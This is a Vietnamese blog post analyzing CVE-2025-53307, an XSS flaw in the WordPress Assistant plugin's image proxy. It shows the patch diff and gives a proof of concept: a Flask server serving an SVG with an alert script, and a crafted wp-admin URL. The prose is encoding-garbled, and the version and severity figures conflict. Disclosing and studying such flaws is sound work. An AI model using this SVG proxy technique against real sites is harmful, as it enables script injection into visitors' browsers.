---
title: CVE-2025-53307 Analysis & POC
description: Security Vulnerability in WordPress Assistant Plugin.
date: 2025-10-03 19:19:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, xss]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

L·ªó h·ªïng x·∫£y ra tr√™n plugin **Assistant** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **3.6.2**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.

* **CVE ID**: [CVE-2025-53307](https://www.cve.org/CVERecord?id=CVE-2025-53307)
* **Product**: [WordPress Assistant Plugin](https://wordpress.org/plugins/assistant/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 1.5.2
* **CVSS severity**: Medium (7.1)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Assistant**:  v1.5.2(vul) v√† v1.5.3(fix)
* **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis

·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL **m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type**. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, n√≥ s·∫Ω th·ª±c thi m√£ ƒë·ªôc => g√¢y ra l·ªó h·ªïng XSS.

### Patch Diff

D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.

{{< figure src="patch_diff.png" caption="Diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°" >}}

Trong tr∆∞·ªùng h·ª£p n√†y, s·ª± kh√°c bi·ªát gi·ªØa 2 phi√™n b·∫£n kh√° nhi·ªÅu, ƒë·ªÉ thu·∫≠n l·ª£i cho vi·ªác truy v·∫øt, ta c√≥ th·ªÉ xem [change log](https://wordpress.org/plugins/assistant/#developers) ƒë·ªÉ bi·∫øt b·∫£n v√° l·ªó h·ªïng XSS ·ªü ƒë√¢u:

```
Changelog
1.5.3 ( 2025-09-08 )

- Changes to support the integration of Assistant in Beaver Builder version 2.10
- Fixed dark mode issues on the Home app and sidebar.
- Security: Fixed a potential XSS vulnerability in the "image proxy"
```

üëâ L·ªó h·ªóng n·∫±m trong file **backend/src/Hooks/ImageProxy.php**, ta quan s√°t s·ª± kh√°c bi·ªát c·ªßa 2 phi√™n b·∫£n:

{{< figure src="patch_diff1.png" caption="S·ª± kh√°c bi·ªát trong h√†m render_image c·ªßa ImageProxy.php" >}}

S·ª± thay ƒë·ªïi x·∫£y ra ·ªü h√†m `render_image` v·ªõi ch·ª©c nƒÉng:

* Nh·∫≠n tham s·ªë url t·ª´ query string `($_GET['url'])`.
* G·ª≠i request t·ª´ server ƒë·∫øn URL ƒë√≥ ƒë·ªÉ t·∫£i n·ªôi dung.
* Ch·ªëng **ssrf** b·∫±ng `wp_safe_remote_get`.
* N·∫øu n·ªôi dung c√≥ header **Content-Type** b·∫Øt ƒë·∫ßu b·∫±ng `image/`, th√¨:

  * G·ª≠i l·∫°i header **Content-Type** ƒë√≥ cho client.
  * In (echo) to√†n b·ªô n·ªôi dung file ra cho tr√¨nh duy·ªát.
* Tr√¨nh duy·ªát hi·ªÉn th·ªã h√¨nh ·∫£nh **kh√¥ng ph·∫£i tr·ª±c ti·∫øp t·ª´ ngu·ªìn g·ªëc m√† th√¥ng qua server WordPress**.

> SVG c≈©ng c√≥ **Content-Type** b·∫Øt ƒë·∫ßu b·∫±ng `image/` v√† c√≥ th·ªÉ ch·ª©a m√£ JavaScript b√™n trong => XSS c√≥ th·ªÉ x·∫£y ra.

B·∫£n v√° ƒë√£ th√™m m·ªôt l·ªõp ki·ªÉm tra **MIME type** th·ª±c s·ª± c·ªßa file ƒë·ªÉ tr√°nh k·ªãch b·∫£n XSS b·∫±ng SVG hay file gi·∫£ m·∫°o.

```php
$filesystem = self::filesystem();
$tmpfile    = tempnam( '/tmp', 'assistant' );
$filesystem->put_contents( $tmpfile, $body );
$validimage = wp_get_image_mime( $tmpfile );
$filesystem->delete( $tmpfile );

if ( ! $validimage ) {
    return false;
}
```

[`wp_get_image_mime()`](https://github.com/WordPress/wordpress-develop/blob/6.8.2/src/wp-includes/functions.php#L3330-L3417) s·ª≠ d·ª•ng h√†m x·ª≠ l√Ω ·∫£nh n·ªôi b·ªô (d·ª±a tr√™n d·ªØ li·ªáu binary c·ªßa file) ƒë·ªÉ x√°c ƒë·ªãnh MIME th·ª±c s·ª±.

N·∫øu k·∫øt qu·∫£ kh√¥ng ph·∫£i l√† ·∫£nh h·ª£p l·ªá => return **false**.

### How it work?

Trong `__construct` c·ªßa class `ImageProxy`, ph∆∞∆°ng th·ª©c `render_image()` ƒë∆∞·ª£c g·ªçi th√¥ng qua callback c·ªßa action hook `'init'`. Hook `'init'` ƒë∆∞·ª£c th·ª±c thi r·∫•t s·ªõm trong qu√° tr√¨nh load WordPress, sau khi c√°c ƒë·ªëi t∆∞·ª£ng core ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng tr∆∞·ªõc khi g·ª≠i output ra tr√¨nh duy·ªát.

`render_image` ch·ªâ ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ quy·ªÅn ch·ªânh s·ª≠a b√†i vi·∫øt c·ªßa ng∆∞·ªùi kh√°c v√† tham s·ªë `$_GET['fl_asst_image_proxy']` t·ªìn t·∫°i.

üëâ Khi truy c·∫≠p `/wp-admin/?fl_asst_image_proxy=value1&url=http://yoursite/image-path` th√¨ `render_image` s·∫Ω ƒë∆∞·ª£c g·ªçi v√† tr·∫£ v·ªÅ n·ªôi dung h√¨nh ·∫£nh cho tr√¨nh duy·ªát hi·ªÉn th·ªã.

## Exploit

### Detect XSS

T·∫°o 1 trang [web](https://github.com/w41bu1/w41test) ƒë∆°n gi·∫£n tr·∫£ v·ªÅ n·ªôi dung SVG ch·ª©a XSS payload

```py
from flask import Flask, Response

app = Flask(__name__)

@app.route('/')
def home():
    return 'Hello, World!'

@app.route('/svg')
def about():
    svg = """<?xml version="1.0" encoding="UTF-8"?>
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert(document.domain)</script>
    </svg>"""
    return Response(svg, mimetype="image/svg+xml")
```

G·ª≠i request ch·ª©a **url param** tr·ªè ƒë·∫øn `https://yoursite/svg`

```
http://localhost/wp-admin/?fl_asst_image_proxy=abc&url=https://yoursite/svg
```

üëâ Th√†nh c√¥ng v·ªõi `Unauthenticated` v√¨ ch·ªâ c·∫ßn ng∆∞·ªùi d√πng c√≥ quy·ªÅn, khi truy c·∫≠p url => XSS x·∫£y ra tr√™n tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n. Attacker kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.

{{< figure src="detect.png" caption="SVG ch·ª©a XSS payload ƒë∆∞·ª£c hi·ªÉn th·ªã qua image proxy" >}}

## Conclusion

L·ªó h·ªïng **CVE-2025-53307** trong plugin WordPress Assistant (**<= v1.5.2**) cho ph√©p XSS th√¥ng qua `render_image()` v√¨ kh√¥ng ki·ªÉm tra **MIME type** th·ª±c c·ªßa file. B·∫£n v√° **v1.5.3** ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch x√°c th·ª±c n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ tr√¨nh duy·ªát.

**Key takeaways**:

* Kh√¥ng tin c·∫≠y v√†o **Content-Type header** t·ª´ **HTTP response**.
* Lu√¥n x√°c th·ª±c **MIME type** th·ª±c s·ª± c·ªßa file.

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress WordPress Assistant Plugin <= 1.5.2 is vulnerable to Cross Site Scripting (XSS)](https://patchstack.com/database/wordpress/plugin/assistant/vulnerability/wordpress-assistant-plugin-1-5-2-cross-site-scripting-xss-vulnerability)
